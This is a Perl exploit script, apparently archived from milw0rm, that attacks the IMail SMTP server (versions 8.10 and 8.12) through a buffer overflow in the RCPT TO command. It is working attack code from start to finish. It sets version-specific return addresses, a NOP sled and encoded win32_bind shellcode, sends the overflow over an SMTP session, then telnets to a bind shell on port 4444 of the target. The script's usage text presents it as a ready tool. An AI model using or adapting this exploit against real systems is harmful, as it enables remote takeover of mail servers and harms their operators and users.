#!/usr/bin/perl
# http://www.zerodayinitiative.com/advisories/ZDI-06-028.html
# http://www.securityfocus.com/bid/19885
# 
# acaro [at] jervus.it


use IO::Socket::INET;
use Switch;

if (@ARGV < 3) {
print \"--------------------------------------------------------------------\\n\";
print \"Usage : Imail-rcpt-overflow.pl -hTargetIPAddress -oTargetReturnAddress\\n\";
print \" Return address: \\n\";
print \" o1 - IMail 8.12 Version\\n\";
print \" o2 - IMail 8.10 Versio\\n\";
print \" Example for IMail 8.12 Version: ./Imail-rcpt-overflow.pl -h127.0.0.1 -o1 \\n\";
print \"--------------------------------------------------------------------\\n\";
}

use IO::Socket::INET;

my $host = 10.0.0.2;
my $port = 25;
my $reply;
my $request;
my $happystack=\"\\x81\\xc4\\xff\\xef\\xff\\xff\\x44\";



foreach (@ARGV) {
$host = $1 if ($_=~/-h((.*)\\.(.*)\\.(.*)\\.(.*))/);
$eip = $1 if ($_=~/-o(.*)/);
}

switch ($eip) {
case 1 { $eip=\"\\xc4\\x91\\x01\\x10\" } # pop eax ret in SmtpDLL.dll for IMail 8.12
case 2 { $eip=\"\\xc3\\x88\\x01\\x10\" } # pop eax ret in SmtpDLL.dll for IMail 8.10
}



# win32_bind -  EXITFUNC=seh LPORT=4444 

my $shellcode  = \"\\x33\\xc9\\x83\\xe9\\xb0\\xe8\\xff\\xff\\xff\\xff\\xc0\\x5e\\x81\\x76\\x0e\\x93\".
\"\\x7b\\xbd\\x36\\x83\\xee\\xfc\\xe2\\xf4\\x6f\\x11\\x56\\x7b\\x7b\\x82\\x42\\xc9\".
\"\\x6c\\x1b\\x36\\x5a\\xb7\\x5f\\x36\\x73\\xaf\\xf0\\xc1\\x33\\xeb\\x7a\\x52\\xbd\".
\"\\xdc\\x63\\x36\\x69\\xb3\\x7a\\x56\\x7f\\x18\\x4f\\x36\\x37\\x7d\\x4a\\x7d\\xaf\".
\"\\x3f\\xff\\x7d\\x42\\x94\\xba\\x77\\x3b\\x92\\xb9\\x56\\xc2\\xa8\\x2f\\x99\\x1e\".
\"\\xe6\\x9e\\x36\\x69\\xb7\\x7a\\x56\\x50\\x18\\x77\\xf6\\xbd\\xcc\\x67\\xbc\\xdd\".
\"\\x90\\x57\\x36\\xbf\\xff\\x5f\\xa1\\x57\\x50\\x4a\\x66\\x52\\x18\\x38\\x8d\\xbd\".
\"\\xd3\\x77\\x36\\x46\\x8f\\xd6\\x36\\x76\\x9b\\x25\\xd5\\xb8\\xdd\\x75\\x51\\x66\".
\"\\x6c\\xad\\xdb\\x65\\xf5\\x13\\x8e\\x04\\xfb\\x0c\\xce\\x04\\xcc\\x2f\\x42\\xe6\".
\"\\xfb\\xb0\\x50\\xca\\xa8\\x2b\\x42\\xe0\\xcc\\xf2\\x58\\x50\\x12\\x96\\xb5\\x34\".
\"\\xc6\\x11\\xbf\\xc9\\x43\\x13\\x64\\x3f\\x66\\xd6\\xea\\xc9\\x45\\x28\\xee\\x65\".
\"\\xc0\\x28\\xfe\\x65\\xd0\\x28\\x42\\xe6\\xf5\\x13\\xac\\x6a\\xf5\\x28\\x34\\xd7\".
\"\\x06\\x13\\x19\\x2c\\xe3\\xbc\\xea\\xc9\\x45\\x11\\xad\\x67\\xc6\\x84\\x6d\\x5e\".
\"\\x37\\xd6\\x93\\xdf\\xc4\\x84\\x6b\\x65\\xc6\\x84\\x6d\\x5e\\x76\\x32\\x3b\\x7f\".
\"\\xc4\\x84\\x6b\\x66\\xc7\\x2f\\xe8\\xc9\\x43\\xe8\\xd5\\xd1\\xea\\xbd\\xc4\\x61\".
\"\\x6c\\xad\\xe8\\xc9\\x43\\x1d\\xd7\\x52\\xf5\\x13\\xde\\x5b\\x1a\\x9e\\xd7\\x66\".
\"\\xca\\x52\\x71\\xbf\\x74\\x11\\xf9\\xbf\\x71\\x4a\\x7d\\xc5\\x39\\x85\\xff\\x1b\".
\"\\x6d\\x39\\x91\\xa5\\x1e\\x01\\x85\\x9d\\x38\\xd0\\xd5\\x44\\x6d\\xc8\\xab\\xc9\".
\"\\xe6\\x3f\\x42\\xe0\\xc8\\x2c\\xef\\x67\\xc2\\x2a\\xd7\\x37\\xc2\\x2a\\xe8\\x67\".
\"\\x6c\\xab\\xd5\\x9b\\x4a\\x7e\\x73\\x65\\x6c\\xad\\xd7\\xc9\\x6c\\x4c\\x42\\xe6\".
\"\\x18\\x2c\\x41\\xb5\\x57\\x1f\\x42\\xe0\\xc1\\x84\\x6d\\x5e\\x63\\xf1\\xb9\\x69\".
\"\\xc0\\x84\\x6b\\xc9\\x43\\x7b\\xbd\\x36\";


my $nop=\"\\x41\"x137;

my $buffer = \"RCPT TO:\".\"\\x20\\x3c\\x40\".$eip . \"\\x3a\" .$nop.$happystack.$shellcode.\"\\x4a\\x61\\x63\\x3e\".\"\\n\";


my $socket = IO::Socket::INET->new(proto=>\'tcp\', PeerAddr=>$host, PeerPort=>$port);
$socket or die \"Cannot connect to host!\\n\";

recv($socket, $reply, 1024, 0);
print \"Response:\" . $reply;


$request = \"EHLO \" . \"\\r\\n\";
send $socket, $request, 0;
print \"[+] Sent  EHLO\\n\";
recv($socket, $reply, 1024, 0);
print \"Response:\" . $reply;


$request = \"MAIL FROM:\" . \"\\x20\" . \"\\x3c\".\"acaro\". \"\\x40\".\"jervus.it\" . \"\\x3e\" . \"\\r\\n\";
send $socket, $request, 0;
print \"[+] Sent  MAIL FROM\\n\";
recv($socket, $reply, 1024, 0);
print \"Response:\" . $reply;




$request = $buffer;
send $socket, $request, 0;
print \"[+] Sent malicius request\\n\";
close $socket;



print \" + connect on port 4444 of $host ...\\n\";
sleep(3);
system(\"telnet $host 4444\");
exit;

# milw0rm.com [2007-02-04]
